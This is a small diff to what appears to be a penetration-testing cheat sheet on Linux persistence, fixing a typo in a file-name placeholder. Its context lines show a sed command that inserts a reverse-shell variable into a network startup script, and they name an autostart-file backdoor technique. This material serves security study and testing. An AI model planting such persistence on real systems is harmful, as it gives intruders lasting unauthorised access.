@@ -50,7 +50,7 @@ sed -i -e "4i \$RSHELL" /etc/network/if-up.d/upstart
 
 ## Backdooring an user startup file
 
-Linux, write a file in  `~/.config/autostart/NOM_OF_FILE.desktop`
+Linux, write a file in  `~/.config/autostart/NAME_OF_FILE.desktop`
 
 ```powershell
 In : ~/.config/autostart/*.desktop
